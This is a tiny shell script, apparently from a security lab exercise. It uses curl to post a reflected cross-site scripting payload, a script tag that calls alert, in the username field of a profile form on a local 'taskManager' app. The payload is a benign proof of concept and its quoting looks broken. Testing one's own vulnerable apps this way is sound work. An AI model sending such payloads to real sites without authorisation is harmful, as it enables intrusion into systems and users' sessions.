#!/bin/sh

#Curl 1 username=<script>alert("XSS");</script>  Attack Reflected XSS
curl --data  "username=<script>alert("XSS");</script>&first_name=seth&last_name=seth&email=seth@gmail.com" localhost:8000/taskManager/profile/2